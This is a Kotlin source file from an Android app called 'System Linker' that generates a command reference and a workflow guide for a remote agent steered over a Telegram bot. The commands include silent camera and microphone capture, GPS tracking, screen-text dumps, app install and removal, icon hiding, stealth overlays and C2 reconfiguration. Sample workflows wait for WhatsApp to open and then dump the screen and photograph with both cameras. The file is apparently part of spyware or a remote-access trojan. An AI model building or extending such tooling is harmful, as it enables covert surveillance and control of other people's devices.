package com.systemlinker.features

import android.content.Context
import java.io.File
import java.io.FileWriter

object HelpGenerator {

    fun generateCommandHelp(context: Context): File {
        val md = """
        # 🛠️ System Linker - Master Command Reference
        
        Welcome to the Command Reference Guide. Below is the complete list of available directives you can send to the agent.
        
        ## 📡 Core System & Info
        | Command | Argument | Description |
        | :--- | :--- | :--- |
        | `ping` | *None* | Checks if device is online & returns battery status. |
        | `info` | *None* | Generates a massive, exhaustive device intelligence report (Hardware, OS, RAM, Storage, Sensors, Network, Installed Apps). |
        | `loc` | *None* | Fetches current high-accuracy GPS coordinates. |
        | `get_log` | *None* | Uploads the internal error logs. |
        | `clear_log` | *None* | Wipes the internal error logs. |
        
        ## 📷 Media & Sensors
        | Command | Argument | Description |
        | :--- | :--- | :--- |
        | `cam_front` | *None* | Captures and uploads a photo using the front camera. |
        | `cam_back` | *None* | Captures and uploads a photo using the back camera. |
        | `mic` | `Int` (Seconds) | Records audio via microphone for the specified duration. *Default: 15s*. |
        | `flash` | `on` / `off` | Toggles the device flashlight. |
        | `vol` | `0` to `100` | Sets media volume percentage. |
        
        ## ⚙️ Device Control & Network
        | Command | Argument | Description |
        | :--- | :--- | :--- |
        | `toggle_wifi` | `on` / `off` | Toggles Wi-Fi state. |
        | `toggle_bt` | `on` / `off` | Toggles Bluetooth state. |
        | `toggle_hotspot` | `on` / `off` | Triggers the stealth Accessibility automation to toggle the Hotspot. |
        | `scan_wifi` | *None* | Returns a list of nearby Wi-Fi networks and signal strengths. |
        | `scan_bt` | *None* | Returns a list of paired Bluetooth devices. |
        
        ## 📱 Application Management
        | Command | Argument | Description |
        | :--- | :--- | :--- |
        | `install_app` | `String` (Path) | Installs an APK from the specified local device path. |
        | `uninstall_app`| `String` (Package) | Uninstalls an app via its package name (e.g., `com.whatsapp`). |
        | `icon_hide` | *None* | Hides the System Linker app icon from the launcher. |
        | `icon_show` | *None* | Restores the System Linker app icon. |
        
        ## 📁 Data & Execution
        | Command | Argument | Description |
        | :--- | :--- | :--- |
        | `download_url` | `JSON` | Downloads a file from the web. Format: `{"url":"https...", "path":"/sdcard/dest.mp4"}`. |
        | `dump_screen` | *None* | Instantly flattens the UI tree and extracts all text, descriptions, and class names into a debug JSON. |
        | `workflow` | `String` (Name) | Initiates workflow execution. Triggers 20s polling to receive your `.yml` file. |
        | `status_workflow`| `String` (Name) | Uploads the live execution log of the specified workflow. |
        
        ## 🔌 Configuration & C2 (Persistent)
        | Command | Argument | Description |
        | :--- | :--- | :--- |
        | `set_bot_api` | `String` (API Key) | Permanently updates the Telegram Bot API Token. |
        | `set_target_chatid`| `Long` (Chat ID)| Permanently updates the authorized Admin Chat ID. |
        | `set_overlay` | *None* | Triggers 20s polling for an Image. Sets image as the persistent stealth overlay. |
        | `set_overlay_duration`| `Long` (ms) | Sets how long the stealth overlay remains active. *Default: 3000*. |
        | `click_after_HS_switch`| `String` + `Int` | Action after Hotspot toggle. Args: `app_launch`, `home,2`, `recent,1`, `back,3`. |
        
        ---
        *Generated dynamically by System Linker Agent.*
        """.trimIndent()

        val file = File(context.cacheDir, "Command_Reference_Guide.md")
        FileWriter(file, false).use { it.write(md) }
        return file
    }

    fun generateWorkflowHelp(context: Context): File {
        val md = """
        # 📚 System Linker - Workflow Engine Documentation
        
        The Workflow Engine is an advanced, context-aware automation framework. It executes sequences defined in YAML-style files.
        
        ## 1. File Structure
        Workflows execute strictly top-to-bottom. Every task block starts with `- type: "..."`.
        
        ```yaml
        - type: "command"
          cmd: "info"
        
        - type: "delay"
          cmd: "2000"
        ```
        
        ---
        
        ## 2. Task Types
        
        ### 🔹 Type: `command`
        Executes native system commands silently in the background.
        *   **`cmd`**: The command to execute (`loc`, `cam_front`, `cam_back`, `info`, `dump_screen`).
        
        ### 🔹 Type: `delay`
        Pauses the workflow. Essential for letting UI animations finish or waiting for loads.
        *   **`cmd`**: Time to wait in milliseconds (e.g., `5000` = 5 seconds).
        
        ### 🔹 Type: `wait_event`
        Completely suspends the workflow until a specific system event occurs.
        *   **`event`**: `app_launch` (App opened) OR `text_input` (User typed something).
        *   **`event_target`**: The package name (e.g., `com.whatsapp`) or the text typed.
        
        ---
        
        ## 3. Type: `ui` (The UI Automator)
        The core of the engine. It uses a hyper-resilient Linear DOM Flattening algorithm to find and interact with UI elements.
        
        ### Parameters:
        *   **`text`** (Required): The anchor text to look for. 
            *   *List Support:* Separate multiple options with a pipe `|` (e.g., `Use Wi-Fi hotspot|Wi-Fi hotspot`).
            *   *Search Scope:* Searches both `text` and `contentDescription`.
        *   **`target`** (Required): The UI element class to interact with.
            *   `Button`, `Switch`, `EditText`, `ImageView`, `ImageButton`, `TextView`, `CheckBox`.
            *   **`none`**: Targets the element containing the anchor `text` itself.
        *   **`action`** (Optional, Default: `click`): What to do with the target.
            *   `click`, `long_click`, `scroll_forward`, `scroll_backward`, `focus`, `set_text`.
        *   **`offset`** (Optional, Default: `1`): If there are multiple targets after the text, which one to pick (1st, 2nd, 3rd). Ignored if target is `none`.
        *   **`case_sensitive`** (Optional, Default: `false`): If false, strips all symbols and spaces to guarantee matches against OEM-modified text (`Wi-Fi` matches `WiFi`).
        
        ### Eventable Climbing Algorithm
        If the targeted element cannot accept the requested `action`, the engine will automatically climb up the UI tree (parent, grandparent) until it finds a container that *is* eventable, and fires the action there.
        
        ---
        
        ## 4. Complete Workflow Example
        
        ```yaml
        # 1. Fetch Location silently
        - type: "command"
          cmd: "loc"
        
        # 2. Wait until WhatsApp is opened by the user
        - type: "wait_event"
          event: "app_launch"
          event_target: "com.whatsapp"
        
        # 3. Wait 2 seconds for app to fully load
        - type: "delay"
          cmd: "2000"
        
        # 4. Find the "Search" text, then find the 1st EditText after it, and click it
        - type: "ui"
          text: "Search"
          target: "EditText"
          action: "click"
          offset: 1
          
        # 5. Extract the raw UI layout to Telegram
        - type: "command"
          cmd: "dump_screen"
        ```
        
        ---
        
        ###Below is an example that illustrates everything:
        ```
        # Workflow: Grand Tour v1
        # Description: A comprehensive demonstration of all advanced workflow capabilities,
        # including UI navigation, event listening, smart searching, and environmental capture.
        
        # --- Phase 1: Initial Reconnaissance ---
        
        - type: "command"
          cmd: "loc"
        
        - type: "command"
          cmd: "info"
        
        - type: "delay"
          cmd: "2000" # Wait 2 seconds before starting UI interactions.
        
        # --- Phase 2: UI Infiltration & Navigation ---
        
        # Task 4: Attempt to open the Settings app from the home screen.
        # We use a list search to find either the text or the description.
        - type: "ui"
          text: "Settings|All apps" # On some launchers, we must click "All apps" first.
          target: "none" # Click the text/icon directly.
          action: "click"
        
        # Task 5: Wait for the Settings app to actually launch.
        # The workflow will pause here until the app with the package name "com.android.settings"
        # becomes the foreground window. This is extremely reliable.
        - type: "wait_event"
          event: "app_launch"
          event_target: "com.android.settings"
        
        - type: "delay"
          cmd: "1500" # Let the Settings app fully load its UI elements.
        
        # Task 7: Scroll down the settings page to find more options.
        # We target the main list container, typically a 'RecyclerView'.
        - type: "ui"
          text: "Network & internet" # Find any text at the top of the screen to anchor the scroll.
          target: "RecyclerView"
          action: "scroll_forward"
          offset: 1
        
        - type: "delay"
          cmd: "1000"
        
        # Task 9: Demonstrate a case-sensitive search that will FAIL.
        # We look for "display", but the screen says "Display".
        - type: "ui"
          text: "display"
          target: "none"
          action: "click"
          case_sensitive: true # This will cause the search to fail, which is intended for this demo.
        
        # Task 10: Now, do the same search correctly (case-insensitive) and click it.
        - type: "ui"
          text: "Display"
          target: "none"
          action: "click"
          case_sensitive: false # Default behavior, will succeed.
        
        - type: "delay"
          cmd: "2000" # Wait for the 'Display' settings page to load.
        
        # --- Phase 3: UI Manipulation & Verification ---
        
        # Task 12: On the 'Display' page, find the 'Brightness' slider.
        # This demonstrates finding a target by its class name after a text anchor.
        # We will perform a long-click on it.
        - type: "ui"
          text: "Brightness level|Brightness"
          target: "SeekBar" # The class name for a slider.
          action: "long_click"
          offset: 1
        
        - type: "delay"
          cmd: "1000"
        
        # Task 14: This is the ultimate verification step. Dump the entire screen's
        # DOM tree to the log file to prove we are on the 'Display' page.
        - type: "command"
          cmd: "dump_screen"
        
        # Task 15: Exit the Settings app completely by pressing back twice.
        # The `executePostHotspotAction` logic in the backend shows how to do this for
        # `back/home/recent`, but this demonstrates doing it manually in a workflow.
        - type: "ui"
          text: "Navigate up|Back" # Use the content-description of the back arrow.
          target: "ImageButton"
          action: "click"
        
        - type: "ui"
          text: "Navigate up|Back"
          target: "ImageButton"
          action: "click"
        
        # --- Phase 4: Environmental Capture ---
        
        - type: "delay"
          cmd: "2000" # Wait to ensure we are back on the home screen.
        
        # Task 18: Capture the environment with both cameras.
        - type: "command"
          cmd: "cam_front"
        - type: "command"
          cmd: "cam_back"
        ```
        *Generated dynamically by System Linker Agent.*
        """.trimIndent()

        val file = File(context.cacheDir, "Workflow_Engine_Guide.md")
        FileWriter(file, false).use { it.write(md) }
        return file
    }
}